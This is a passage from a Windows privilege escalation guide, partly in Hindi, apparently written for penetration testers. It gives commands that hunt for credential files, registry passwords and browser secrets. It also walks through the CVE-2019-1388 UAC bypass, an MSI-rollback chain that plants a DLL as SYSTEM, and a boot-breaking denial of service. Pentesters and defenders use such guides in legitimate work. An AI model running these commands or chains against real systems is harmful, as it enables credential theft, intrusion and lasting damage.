%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सुझाए गए सभी फ़ाइलों को खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में credentials

Bin के अंदर credentials के लिए भी जाँच करें

कई प्रोग्रामों द्वारा सहेजे गए **recover passwords** को प्राप्त करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**credentials वाले अन्य संभावित registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र्स इतिहास

You should check for dbs where passwords from **Chrome or Firefox** are stored.\
ब्राउज़रों का इतिहास (history), बुकमार्क्स और फ़ेवरेट्स भी चेक करें — संभवतः कुछ **पासवर्ड** वहां स्टोर हो सकते हैं।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows ऑपरेटिंग सिस्टम में निर्मित एक तकनीक है जो विभिन्न भाषाओं के सॉफ़्टवेयर components के बीच **आपस में संचार** की अनुमति देती है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से कार्यक्षमता एक्सपोज़ करता है, जिनकी पहचान interface IDs (IIDs) द्वारा होती है।

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी तौर पर, अगर आप वह कर पाते हैं — अर्थात् किसी भी **overwrite any of the DLLs** को बदल सकते हैं जो execute होने वाले हैं — तो अगर वह DLL किसी अलग user द्वारा execute किया जाता है तो आप **escalate privileges** कर सकते हैं।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशिष्ट फ़ाइल नाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin मैंने बनाया है; यह प्लगइन लक्ष्य के अंदर credentials को खोजने वाले हर metasploit POST module को स्वतः चलाता है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) उन सभी फ़ाइलों को स्वतः खोजता है जिनमें इस पृष्ठ में उल्लिखित passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से password निकालने के लिए एक और शानदार टूल है।

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना कीजिए कि **SYSTEM के रूप में चल रहा एक प्रोसेस एक नया प्रोसेस खोलता है** (`OpenProcess()`) जिसके पास **पूर्ण एक्सेस** है। वही प्रोसेस **एक नया प्रोसेस भी बनाता है** (`CreateProcess()`) **जो कम विशेषाधिकार वाला है लेकिन मुख्य प्रोसेस के सभी खुले हैंडल्स विरासत में ले रहा है**।\
तब, यदि आपके पास उस कम-विशेषाधिकार प्रोसेस तक **पूर्ण एक्सेस** है, तो आप `OpenProcess()` के साथ बनाए गए उच्च विशेषाधिकार प्रोसेस के **खुले हैंडल** को पकड़कर उसमें **shellcode इंजेक्ट** कर सकते हैं।\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, प्रोसेस कम्युनिकेशन और डेटा ट्रांसफर की सुविधा देते हैं।

Windows provides a feature called **Named Pipes**, जो unrelated प्रोसेसों को डेटा शेयर करने की अनुमति देती है, यहाँ तक कि अलग-अलग नेटवर्क्स पर भी। यह एक client/server architecture जैसा होता है, जहां रोल्स को **named pipe server** और **named pipe client** के रूप में परिभाषित किया जाता है।

जब किसी **client** द्वारा किसी pipe के माध्यम से डेटा भेजा जाता है, तो वह **server** जिसने pipe सेटअप किया है, आवश्यक **SeImpersonate** अधिकार होने पर उस **client** की पहचान ग्रहण करने में सक्षम होता है। यदि आप किसी ऐसे **privileged process** की पहचान कर लें जो आपके बनाए गए पाइप के माध्यम से संचार कर रहा हो और जिसे आप नकल कर सकें, तो जब वह प्रोसेस आपके स्थापित पाइप से इंटरैक्ट करे तो आप उसकी पहचान अपनाकर **उच्च विशेषाधिकार प्राप्त करने** का मौका पा सकते हैं। इस तरह के हमले को करने के निर्देशों के लिए उपयोगी गाइड्स [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकते हैं।

इसके अलावा निम्नलिखित टूल से आप **named pipe संचार को burp जैसे टूल के साथ intercept कर सकते हैं:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह टूल सभी पाइप्स की लिस्ट और देखने की सुविधा देता है ताकि privescs ढूंढे जा सकें** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## विविध

### File Extensions that could execute stuff in Windows

इस पेज को देखें **[https://filesec.io/](https://filesec.io/)**

### **पासवर्ड के लिए कमांड लाइनों की मॉनिटरिंग**

जब किसी यूजर के रूप में shell मिलती है, तो हो सकता है कि कुछ scheduled tasks या अन्य प्रोसेस चल रहे हों जो **कमांड लाइन पर क्रेडेंशियल पास करते हैं**। नीचे दिया गया स्क्रिप्ट हर दो सेकंड में प्रोसेस कमांड लाइनों को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछले स्थिति से करता है, तथा किसी भी अंतर को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रोसेसों से पासवर्ड चुराना

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (console या RDP के माध्यम से) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में एक unprivileged user से "NT\AUTHORITY SYSTEM" जैसे terminal या किसी अन्य process को चलाना संभव है।

यह उसी vulnerability का उपयोग करके एक ही समय में privileges escalate करने और UAC को bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued होता है।

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability का exploit करने के लिए, निम्नलिखित चरण आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator से Medium से High Integrity Level तक / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह attack मूल रूप से Windows Installer के rollback feature का दुरुपयोग करके uninstall प्रक्रिया के दौरान legitimate files को malicious files से replace करने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग होगा, जिसे बाद में Windows Installer अन्य MSI packages के uninstall के दौरान rollback files स्टोर करने के लिए उपयोग करेगा — जहाँ rollback files को malicious payload रखने के लिए modify किया जाएगा।

संक्षेप में तकनीक इस प्रकार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- बूम: आपका कोड **SYSTEM के रूप में** execute हो जाएगा।

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

इसलिए, यदि आप फ़ोल्डर के **`::$INDEX_ALLOCATION` stream` को हटा देते हैं**, तो NTFS **पूरे फ़ोल्डर को फ़ाइल सिस्टम से हटा देता है**।

आप इसे मानक फ़ाइल-हटाने वाली APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **folder itself को डिलीट कर देता है**।

### From Folder Contents Delete to SYSTEM EoP
What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the *contents* of an attacker-controlled folder**?

1. Step 1: एक bait folder और file सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** रखें
- यह oplock **pauses execution** कर देता है जब कोई privileged process `file1.txt` को डिलीट करने की कोशिश करता है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों को स्कैन करती है (उदा., `%TEMP%`) और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- विकल्प A: `file1.txt` को कहीं और ले जाएँ
- यह `folder1` को खाली कर देता है बिना oplock को तोड़े।
- सीधा `file1.txt` हटाएँ मत — ऐसा करने से oplock समयपूर्व रूप से छोड़ देगा।

- विकल्प B: `folder1` को **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: एक **symlink** `\RPC Control` में बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS आंतरिक stream को लक्षित करता है जो फ़ोल्डर का metadata स्टोर करता है — इसे डिलीट करने से फ़ोल्डर डिलीट हो जाता है।

5. चरण 5: oplock को मुक्त करें
- SYSTEM प्रोसेस जारी रहता है और `file1.txt` को डिलीट करने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह असल में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटाया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

एक primitive का शोषण करें जो आपको **SYSTEM/admin के रूप में कोई भी फ़ोल्डर बनाने** की अनुमति देता है — भले ही आप **फ़ाइलें लिख न सकें** या **कमज़ोर अनुमतियाँ सेट न कर सकें**।

ऐसा **फ़ोल्डर** (फ़ाइल नहीं) बनाएं जिसका नाम किसी **महत्वपूर्ण Windows driver** के नाम जैसा हो, उदा.:
```
C:\Windows\System32\cng.sys
```
- यह path सामान्यतः `cng.sys` kernel-mode driver के अनुरूप होता है।
- यदि आप इसे **pre-create it as a folder** कर देते हैं, तो Windows बूट पर वास्तविक driver को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` को लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक driver को resolve करने में विफल होता है**, और **बूट क्रैश हो जाता है या रुक जाता है**।
- बिना बाहरी हस्तक्षेप (उदा., boot repair या disk access) के **कोई fallback नहीं**, और **कोई recovery नहीं**।


## **High Integrity से SYSTEM तक**

### **New service**

यदि आप पहले से ही High Integrity process पर चल रहे हैं, तो **SYSTEM तक का path** बस **नया service बनाकर और उसे execute करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब एक service binary बनाते समय सुनिश्चित करें कि वह एक वैध service हो या binary आवश्यक क्रियाएँ इतनी जल्दी करे क्योंकि अगर यह वैध service नहीं होगा तो इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable करने** और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने की कोशिश कर सकते हैं।\
[registry keys involved और _.msi_ package को कैसे install करें इसके बारे में अधिक जानकारी यहाँ।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**कोड यहाँ पाएँ**](seimpersonate-from-high-to-system.md)**।**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हों (संभावित रूप से आप इसे पहले से किसी High Integrity process में पाएँगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes को छोड़कर) को **open** कर पाएँगे, उस process का **token copy** कर सकेंगे, और उस token के साथ एक **arbitrary process create** कर सकेंगे।\
इस technique में आमतौर पर SYSTEM के रूप में चल रहे किसी process का चयन किया जाता है जिसके पास सभी token privileges हों (_हाँ, आप ऐसे SYSTEM processes भी पाएँगे जिनके पास सभी token privileges नहीं होते_)।\
**आप एक** [**उदाहरण कोड यहाँ पा सकते हैं जो प्रस्तावित technique execute करता है**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

यह technique meterpreter द्वारा `getsystem` में escalate करने के लिए उपयोग की जाती है। यह तकनीक **एक pipe बनाने और फिर उस pipe पर लिखने के लिए किसी service को create/abuse करने** पर आधारित है। फिर, वह **server** जिसने pipe बनाया था और जो **`SeImpersonate`** privilege का उपयोग करता है, वह pipe client (service) के token को **impersonate** कर सकता है और SYSTEM privileges प्राप्त कर सकता है।\
यदि आप [**named pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation)。\
यदि आप एक उदाहरण पढ़ना चाहते हैं कि [**कैसे high integrity से Named Pipes का उपयोग कर System तक जाएँ**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

अगर आप किसी **dll को hijack** कर लेते हैं जिसे **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **load** किया जा रहा है, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस प्रकार की privilege escalation के लिए उपयोगी है, और इसे high integrity process से हासिल करना अक्सर बहुत ही आसान होता है क्योंकि उसके पास dlls load करने में उपयोग होने वाले फोल्डरों पर **write permissions** होते हैं।\
**आप** [**Dll hijacking के बारे में और जान सकते हैं यहाँ**](dll-hijacking/index.html)**।**

### From Administrator or Network Service to System

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

पढ़ें: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और संवेदनशील फाइलों के लिए जांच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- संभावित misconfigurations की जांच और जानकारी इकट्ठा करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations के लिए जांच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी extract करता है। लोकल में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठे किए गए पासवर्ड्स को domain पर spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- जानामाना privesc vulnerabilities के लिए खोज (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights चाहिए)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- जानामाना privesc vulnerabilities के लिए खोज (VisualStudio का उपयोग कर compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- होस्ट को enumerate करता है और misconfigurations खोजता है (ज्यादा gather info tool है बजाय privesc के) (compile करने की आवश्यकता) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github में precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- misconfiguration के लिए चेक (executable github में precompiled). सुझाया नहीं जाता। यह Win10 में अच्छी तरह काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations के लिए चेक (python से exe). सुझाया नहीं जाता। Win10 में अच्छी तरह काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट पर आधारित बनाया गया tool (इसके proper काम करने के लिए accesschk की ज़रूरत नहीं पर यह इसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़कर उपयुक्त exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़कर उपयुक्त exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको project को सही .NET version का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). लक्षित होस्ट पर इंस्टॉल .NET version देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
